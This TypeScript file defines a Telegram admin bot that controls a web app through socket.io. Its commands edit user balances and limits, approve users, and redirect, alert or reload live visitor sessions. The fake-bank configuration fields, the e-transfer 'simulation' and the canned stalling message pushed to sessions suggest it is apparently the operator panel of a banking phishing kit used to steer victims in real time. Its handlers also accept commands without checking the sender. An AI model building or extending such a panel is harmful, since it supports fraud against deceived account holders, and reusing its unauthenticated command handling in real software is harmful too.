import TelegramBot from 'node-telegram-bot-api';
import { Server } from 'socket.io';

interface TelegramBridge {
  broadcastAdminUpdate: (activeUsers: unknown, logs: unknown[], chatMessages: Record<string, unknown[]>) => void;
  adminCommandExecuted: (command: string, payload: unknown) => void;
  forwardChatMessage: (roomId: string, message: any) => void;
}

export async function initTelegram(
  io: Server, 
  token: string, 
  chatId: string, 
  updateSettings?: (key: string, value: unknown) => void
): Promise<{ bridge: TelegramBridge; close: () => Promise<void> }> {
  if (!token || !chatId) {
    console.warn('[Telegram] Token or Chat ID missing, bot not initialized');
    return {
      bridge: {
        broadcastAdminUpdate: () => {},
        adminCommandExecuted: () => {},
        forwardChatMessage: () => {}
      },
      close: async () => {}
    };
  }

  const bot = new TelegramBot(token, { polling: true });
  (global as any).telegramBot = bot;
  (global as any).telegramWebhookPath = `/bot${token}`;

  const mainKeyboard = {
    reply_markup: {
      keyboard: [
        [{ text: '📊 System Stats' }, { text: '👥 List Users' }],
        [{ text: '💸 Send E-Transfer' }, { text: '📢 Send Notice' }],
        [{ text: '⚙️ Settings' }, { text: '❓ Help' }]
      ],
      resize_keyboard: true,
      one_time_keyboard: false
    }
  };

  const topics = {
    alerts: 1, // You should replace these with actual topic IDs from Telegram
    logs: 2,
    chats: 3
  };

  const notify = (topicId: number, text: string) => {
    bot.sendMessage(chatId, text, { parse_mode: 'HTML', message_thread_id: topicId });
  };

  bot.onText(/\/approve (\w+)/, async (msg, match) => {
    const username = match?.[1];
    if (!username) return;
    
    try {
        const response = await fetch(`http://localhost:3000/api/admin/users/approve.php`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username })
        });
        const data: unknown = await response.json();
        if((data as any).success) notify(topics.alerts, `✅ User <b>${username}</b> approved.`);
        else notify(topics.alerts, `❌ Failed to approve user <b>${username}</b>.`);
      } catch (e: unknown) {
        const errorMessage = e instanceof Error ? e.message : String(e);
        notify(topics.alerts, `❌ Error: ${errorMessage}`);
      }
  });

  bot.onText(/\/decline (\w+)/, async (msg, match) => {
    const username = match?.[1];
    if (!username) return;
    
    try {
        const response = await fetch(`http://localhost:3000/api/admin/users/decline.php`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username })
        });
        const data: unknown = await response.json();
        if((data as any).success) notify(topics.alerts, `✅ User <b>${username}</b> declined.`);
        else notify(topics.alerts, `❌ Failed to decline user <b>${username}</b>.`);
      } catch (e: unknown) {
        const errorMessage = e instanceof Error ? e.message : String(e);
        notify(topics.alerts, `❌ Error: ${errorMessage}`);
      }
  });

  bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, 'Welcome to the Admin Control Bot! Choose an option:', mainKeyboard);
  });

  bot.onText(/\/help/, (msg) => {
    const helpText = `
<b>Available Commands:</b>
/start - Start the bot and show main menu
/help - Show this help message
/settings - Show bot settings
/stats - Show system statistics
/users - List all registered users
/notice &lt;msg&gt; - Broadcast a message to all users
/limit &lt;user&gt; &lt;type&gt; &lt;val&gt; - Set user limit (transfer/daily/overdraft)
/balance &lt;user&gt; &lt;acc&gt; &lt;val&gt; - Set user account balance
/toggle &lt;user&gt; - Enable/Disable a user account
/config - Show current server configuration
/sessions - List active socket sessions
/redirect &lt;id&gt; &lt;path&gt; - Redirect a session
/alert &lt;id&gt; &lt;msg&gt; - Send alert to session
/reload &lt;id&gt; - Reload a session

<b>Buttons:</b>
📊 System Stats - Real-time server metrics
👥 List Users - View all users in database
💸 Send E-Transfer - Trigger e-transfer simulation
🧪 Test Function - Run a system health check
⚙️ Settings - Configure bot and server options
`;
    bot.sendMessage(msg.chat.id, helpText, { parse_mode: 'HTML' });
  });

  bot.onText(/\/settings/, (msg) => {
    bot.sendMessage(msg.chat.id, 'Bot Settings:', {
      reply_markup: {
        keyboard: [
          [{ text: '🔔 Toggle Notifications' }, { text: '🔐 Change Admin PIN' }],
          [{ text: 'Back' }]
        ],
        resize_keyboard: true
      }
    });
  });

  bot.onText(/\/stats/, (msg) => {
    const stats = (global as any).getStats?.() || { activeUsers: 0, totalLogs: 0, totalChats: 0 };
    const statsText = `
<b>System Statistics:</b>
🟢 Active Users: ${stats.activeUsers}
📝 Total Logs: ${stats.totalLogs}
💬 Active Chats: ${stats.totalChats}
🕒 Server Time: ${new Date().toLocaleString()}
`;
    bot.sendMessage(msg.chat.id, statsText, { parse_mode: 'HTML' });
  });

  bot.onText(/\/users/, (msg) => {
    const users = (global as any).getUsers?.() || [];
    if (users.length === 0) {
      bot.sendMessage(msg.chat.id, 'No users found.');
      return;
    }
    const userList = users.map((u: any) => `• <b>${u.username}</b> (${u.enabled ? '✅ Enabled' : '❌ Disabled'})`).join('\n');
    bot.sendMessage(msg.chat.id, `<b>Registered Users:</b>\n${userList}`, { parse_mode: 'HTML' });
  });

  bot.onText(/\/notice (.+)/, (msg, match) => {
    const message = match?.[1];
    if (!message) return;

    io.emit('system_notice', { message, timestamp: new Date().toISOString() });
    bot.sendMessage(msg.chat.id, `✅ <b>Broadcast Sent:</b>\n${message}`, { parse_mode: 'HTML' });
  });

  bot.onText(/\/limit (\w+) (\w+) (\d+)/, (msg, match) => {
    const username = match?.[1];
    const type = match?.[2];
    const value = parseInt(match?.[3] || '0');

    if (!username || !type) return;

    const users = (global as any).getUsers?.() || [];
    const user = users.find((u: any) => u.username === username);

    if (!user) {
      bot.sendMessage(msg.chat.id, `❌ User <b>${username}</b> not found.`, { parse_mode: 'HTML' });
      return;
    }

    const settings = { ...user.settings };
    if (type === 'transfer') settings.transferLimit = value;
    else if (type === 'daily') settings.dailyLimit = value;
    else if (type === 'overdraft') settings.overdraftLimit = value;
    else {
      bot.sendMessage(msg.chat.id, '❌ Invalid limit type. Use: transfer, daily, or overdraft.');
      return;
    }

    const success = (global as any).updateUser?.(username, { settings });
    if (success) {
      bot.sendMessage(msg.chat.id, `✅ Updated <b>${type}</b> limit for <b>${username}</b> to <b>$${value}</b>`, { parse_mode: 'HTML' });
    }
  });

  bot.onText(/\/balance (\w+) (.+) (\d+)/, (msg, match) => {
    const username = match?.[1];
    const accountName = match?.[2];
    const value = parseFloat(match?.[3] || '0');

    if (!username || !accountName) return;

    const users = (global as any).getUsers?.() || [];
    const user = users.find((u: any) => u.username === username);

    if (!user || !user.accounts[accountName]) {
      bot.sendMessage(msg.chat.id, `❌ User or account not found.`, { parse_mode: 'HTML' });
      return;
    }

    const accounts = { ...user.accounts };
    accounts[accountName] = { ...accounts[accountName], balance: value, available: value };

    const success = (global as any).updateUser?.(username, { accounts });
    if (success) {
      bot.sendMessage(msg.chat.id, `✅ Updated <b>${accountName}</b> balance for <b>${username}</b> to <b>$${value}</b>`, { parse_mode: 'HTML' });
    }
  });

  bot.onText(/\/toggle (\w+)/, (msg, match) => {
    const username = match?.[1];
    if (!username) return;

    const users = (global as any).getUsers?.() || [];
    const user = users.find((u: any) => u.username === username);

    if (!user) {
      bot.sendMessage(msg.chat.id, `❌ User not found.`, { parse_mode: 'HTML' });
      return;
    }

    const success = (global as any).updateUser?.(username, { enabled: !user.enabled });
    if (success) {
      bot.sendMessage(msg.chat.id, `✅ User <b>${username}</b> is now <b>${!user.enabled ? 'Enabled' : 'Disabled'}</b>`, { parse_mode: 'HTML' });
    }
  });

  bot.onText(/\/config/, (msg) => {
    const config = (global as any).getConfig?.() || {};
    const configText = `
<b>Server Config:</b>
🏦 Bank: ${config.general?.bank_name}
👤 Sender: ${config.general?.sender_name}
🛠 Maintenance: ${config.general?.maintenanceMode ? '🔴 ON' : '🟢 OFF'}
💸 Transfer Limit: $${config.general?.transferLimit}
`;
    bot.sendMessage(msg.chat.id, configText, { parse_mode: 'HTML' });
  });
  
  bot.onText(/\/sessions/, (msg) => {
    const activeUsers = (global as any).getActiveUsers?.() || {};
    const sessions = Object.values(activeUsers);
    if (sessions.length === 0) {
      bot.sendMessage(msg.chat.id, 'No active sessions.');
      return;
    }
    const sessionList = sessions.map((s: any) => `• <b>${s.username}</b>\n  ID: <code>${s.id}</code>\n  Path: ${s.currentPath}`).join('\n\n');
    bot.sendMessage(msg.chat.id, `<b>Active Sessions:</b>\n\n${sessionList}`, { parse_mode: 'HTML' });
  });

  bot.onText(/\/redirect (\S+) (\S+)/, (msg, match) => {
    const targetId = match?.[1];
    const path = match?.[2];
    if (!targetId || !path) return;
    (global as any).sendCommand?.(targetId, 'redirect', { path });
    bot.sendMessage(msg.chat.id, `✅ Redirected <code>${targetId}</code> to <code>${path}</code>`, { parse_mode: 'HTML' });
  });

  bot.onText(/\/alert (\S+) (.+)/, (msg, match) => {
    const targetId = match?.[1];
    const message = match?.[2];
    if (!targetId || !message) return;
    (global as any).sendCommand?.(targetId, 'alert', { message });
    bot.sendMessage(msg.chat.id, `✅ Alert sent to <code>${targetId}</code>`, { parse_mode: 'HTML' });
  });

  bot.onText(/\/reload (\S+)/, (msg, match) => {
    const targetId = match?.[1];
    if (!targetId) return;
    (global as any).sendCommand?.(targetId, 'reload');
    bot.sendMessage(msg.chat.id, `✅ Reload command sent to <code>${targetId}</code>`, { parse_mode: 'HTML' });
  });

  bot.on('callback_query', async (query) => {
    const data = query.data;
    if (!data) return;

    const [action, username, extra] = data.split(':');

    if (action === 'approve') {
       try {
        const response = await fetch(`http://localhost:3000/api/admin/users/approve.php`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username })
        });
        const data = await response.json();
        if(data.success) {
            bot.answerCallbackQuery(query.id, { text: `Approved ${username}` });
            bot.editMessageText(`✅ User <b>${username}</b> approved.`, { chat_id: query.message?.chat.id, message_id: query.message?.message_id, parse_mode: 'HTML' });
        } else {
            bot.answerCallbackQuery(query.id, { text: `Failed to approve ${username}` });
        }
       } catch (e: any) {
           bot.answerCallbackQuery(query.id, { text: `Error: ${e.message}` });
       }
    } else if (action === 'decline') {
       try {
        const response = await fetch(`http://localhost:3000/api/admin/users/decline.php`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username })
        });
        const data = await response.json();
        if(data.success) {
            bot.answerCallbackQuery(query.id, { text: `Declined ${username}` });
            bot.editMessageText(`❌ User <b>${username}</b> declined.`, { chat_id: query.message?.chat.id, message_id: query.message?.message_id, parse_mode: 'HTML' });
        } else {
            bot.answerCallbackQuery(query.id, { text: `Failed to decline ${username}` });
        }
       } catch (e: any) {
           bot.answerCallbackQuery(query.id, { text: `Error: ${e.message}` });
       }
    } else if (action === 'redirect') {
      const path = extra || '/';
      (global as any).sendCommand?.(username, 'redirect', { path });
      bot.answerCallbackQuery(query.id, { text: `Redirecting ${username} to ${path}` });
    } else if (action === 'alert') {
      const message = "Please wait while we process your request...";
      (global as any).sendCommand?.(username, 'alert', { message });
      bot.answerCallbackQuery(query.id, { text: `Alert sent to ${username}` });
    } else if (action === 'reload') {
      (global as any).sendCommand?.(username, 'reload');
      bot.answerCallbackQuery(query.id, { text: `Reloading ${username}` });
    } else if (action === 'block') {
      (global as any).sendCommand?.(username, 'block_ip', { ip: extra });
      bot.answerCallbackQuery(query.id, { text: `IP ${username} added to blacklist.` });
    }
  });

  bot.on('message', (msg) => {
    const text = msg.text;
    const chatId = msg.chat.id;
    if (!text) return;

    if (text === '💸 Send E-Transfer') {
      bot.sendMessage(chatId, 'Select E-Transfer amount:', {
        reply_markup: {
          keyboard: [[{ text: '$50' }, { text: '$100' }, { text: '$500' }], [{ text: 'Back' }]],
          resize_keyboard: true
        }
      });
    } else if (text === '📢 Send Notice') {
      bot.sendMessage(chatId, 'To send a notice, use the command:\n`/notice Your message here`', { parse_mode: 'Markdown' });
    } else if (text === '🧪 Test Function') {
      bot.sendMessage(chatId, 'Running system test...');
      setTimeout(() => bot.sendMessage(chatId, '✅ Test completed: All systems operational.'), 1000);
    } else if (text === '⚙️ Settings') {
      bot.sendMessage(chatId, 'Settings Menu:', {
        reply_markup: {
          keyboard: [
            [{ text: '🔔 Toggle Notifications' }, { text: '🛠 Toggle Maintenance' }],
            [{ text: '🔐 Change Admin PIN' }, { text: 'Back' }]
          ],
          resize_keyboard: true
        }
      });
    } else if (text === '🔔 Toggle Notifications') {
      const current = (global as any).getConfig?.()?.notificationsEnabled || false;
      updateSettings?.('notificationsEnabled', !current);
      bot.sendMessage(chatId, `✅ Notifications now: ${!current ? 'ENABLED' : 'DISABLED'}.`);
    } else if (text === '🛠 Toggle Maintenance') {
      const current = (global as any).getConfig?.()?.maintenanceMode || false;
      updateSettings?.('maintenanceMode', !current);
      bot.sendMessage(chatId, `⚠️ Maintenance mode ${!current ? 'ENABLED' : 'DISABLED'}.`);
    } else if (text === '🔐 Change Admin PIN') {
      bot.sendMessage(chatId, 'Please enter the new 4-digit PIN in this format:\n/pin <new_pin>');
    } else if (text === '📊 System Stats') {
      const stats = (global as any).getStats?.() || { activeUsers: 0, totalLogs: 0, totalChats: 0 };
      bot.sendMessage(chatId, `<b>Stats:</b>\nUsers: ${stats.activeUsers}\nLogs: ${stats.totalLogs}`, { parse_mode: 'HTML' });
    } else if (text === '👥 List Users') {
      const users = (global as any).getUsers?.() || [];
      if (users.length === 0) {
          bot.sendMessage(chatId, 'No users found.');
          return;
      }
      users.forEach((u: any) => {
        bot.sendMessage(chatId, `User: <b>${u.username}</b>\nStatus: ${u.enabled ? '✅' : '❌'}`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: 'Approve', callback_data: `approve:${u.username}` },
                    { text: 'Decline', callback_data: `decline:${u.username}` }
                ]]
            }
        });
      });
    } else if (text === 'Back') {
      bot.sendMessage(chatId, 'Returning to Main Menu', mainKeyboard);
    } else if (text.startsWith('$')) {
      bot.sendMessage(chatId, `✅ Initiating E-Transfer of ${text}...`);
      // Could trigger actual transfer logic here
    }
  });


  const bridge = {
    broadcastAdminUpdate: (_activeUsers: unknown, _logs: unknown[], _chatMessages: Record<string, unknown[]>) => {
      // Optional: Send periodic updates
    },
    adminCommandExecuted: (command: string, payload: unknown) => {
      bot.sendMessage(chatId, `Command executed: ${command}\nPayload: ${JSON.stringify(payload)}`, { parse_mode: 'HTML' });
    },
    forwardChatMessage: (_roomId: string, message: any) => {
      bot.sendMessage(chatId, `Chat from ${message.sender}: ${message.text}`, { parse_mode: 'HTML' });
    }
  };

  const close = async () => {
    await bot.stopPolling();
  };

  return { bridge, close };
}
